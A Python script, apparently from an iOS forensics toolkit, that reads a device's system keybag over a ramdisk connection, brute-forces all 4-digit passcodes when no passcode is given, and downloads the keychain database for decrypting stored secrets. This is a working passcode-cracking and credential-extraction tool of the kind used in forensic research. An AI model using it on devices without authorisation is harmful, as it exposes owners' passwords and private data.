import plistlib
import os
from keystore.keybag import Keybag
from keychain.keychain4 import Keychain4
from keychain.managedconfiguration import bruteforce_old_pass
from util.ramdiskclient import RamdiskToolClient
from util import write_file

def checkPasscodeComplexity(rdclient):
    pl = rdclient.downloadFile("/mnt2/mobile/Library/ConfigurationProfiles/UserSettings.plist")
    if not pl:
        print "Failed to download UserSettings.plist, assuming simple passcode"
        return 0
    pl = plistlib.readPlistFromString(pl)
    print "passcodeKeyboardComplexity :", pl["restrictedValue"]["passcodeKeyboardComplexity"]
    return pl["restrictedValue"]["passcodeKeyboardComplexity"]["value"]

def bf_system():
    client = RamdiskToolClient()
    di = client.getDeviceInfos()
    devicedir = di["udid"]
    if os.getcwd().find(devicedir) == -1:
        try:
            os.mkdir(devicedir)
        except:
            pass
        os.chdir(devicedir)
    key835 = di.get("key835").decode("hex")
    
    systembag = client.getSystemKeyBag()
    kbkeys = systembag["KeyBagKeys"].data
    kb = Keybag.createWithDataSignBlob(kbkeys, key835)
    keybags = di.setdefault("keybags", {})
    kbuuid = kb.uuid.encode("hex")
    print "Keybag UUID :", kbuuid
    if True and keybags.has_key(kbuuid) and keybags[kbuuid].has_key("passcodeKey"):
        print "We've already seen this keybag"
        passcodeKey = keybags[kbuuid].get("passcodeKey").decode("hex")
        print kb.unlockWithPasscodeKey(passcodeKey)
        kb.printClassKeys()
    else:
        keybags[kbuuid] = {"KeyBagKeys": systembag["KeyBagKeys"]}
        di["KeyBagKeys"] = systembag["KeyBagKeys"]
        di.save()
        print "Enter passcode or leave blank for bruteforce:"
        z = raw_input()
        res = client.getPasscodeKey(systembag["KeyBagKeys"].data, z)
        if kb.unlockWithPasscodeKey(res.get("passcodeKey").decode("hex")):
            print "Passcode \"%s\" OK" % z
            di.update(res)
            keybags[kbuuid].update(res)
            di.save()
            keychain_blob = client.downloadFile("/mnt2/Keychains/keychain-2.db")
            write_file("keychain-2.db", keychain_blob)
            print "Downloaded keychain database, use keychain_tool.py to decrypt secrets"
            return
        if z != "":
            print "Wrong passcode, trying to bruteforce !"
        if checkPasscodeComplexity(client) == 0:
            print "Trying all 4-digits passcodes..."
            bf = client.bruteforceKeyBag(systembag["KeyBagKeys"].data)
            if bf:
                di.update(bf)
                keybags[kbuuid].update(bf)
            print bf
            print kb.unlockWithPasscodeKey(bf.get("passcodeKey").decode("hex"))
            kb.printClassKeys()
            di["classKeys"] = kb.getClearClassKeysDict()
            di.save()
        else:
            print "Complex passcode used !"
            return
        
    #keychain_blob =    client.downloadFile("/private/var/Keychains/keychain-2.db")
    keychain_blob = client.downloadFile("/mnt2/Keychains/keychain-2.db")
    write_file("keychain-2.db", keychain_blob)
    print "Downloaded keychain database, use keychain_tool.py to decrypt secrets"

bf_system()
